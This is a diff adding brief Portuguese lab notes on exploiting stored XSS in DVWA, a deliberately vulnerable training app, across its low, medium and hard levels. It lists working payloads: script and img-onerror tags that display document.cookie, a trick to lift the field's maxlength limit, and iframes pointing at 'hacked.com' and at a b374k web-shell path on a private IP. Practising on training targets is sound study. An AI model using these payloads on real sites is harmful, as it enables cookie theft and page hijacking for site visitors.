@@ -1,0 +1,41 @@
+HELP_Stored_XSS_DOM_DVWA
+
+LOW
+
+Stored = É uma forma de ataque persistente de XSS, ou seja
+comentamos um script que roda no site até que esse comentário
+seja excluído. 
+
+1 = Primeiro vamos explorar mandando um comentário para a página.
+
+Name: Hack
+Message: <script>alert(document.cookie);</script>
+
+2 = Todas as vezes que entrar na pagina a mesma ira mostrar o cookie
+da página. 
+
+######################################################################
+
+MEDIUM
+
+1 = Vamos adicionar em Name o comando, caso ainda esteja restrito
+é só botão direito > Inspect > maxlength="10" para "90"
+
+<img src="x" onerror="alert('stored xss');">
+
+<img src="x" onerror="alert(document.cookie);">
+
+Não esqueça o campo de mensagem que não pode está vazio. 
+
+######################################################################
+
+HARD
+
+1 = Vamos adicionar em Name o comando, caso ainda esteja restrito
+é só botão direito > Inspect > maxlength="10" para "90"
+
+<iframe src="https//:hacked.com"></iframe>
+
+<iframe src="http://10.60.4.61/b374k/index.php"></iframe>
+
+
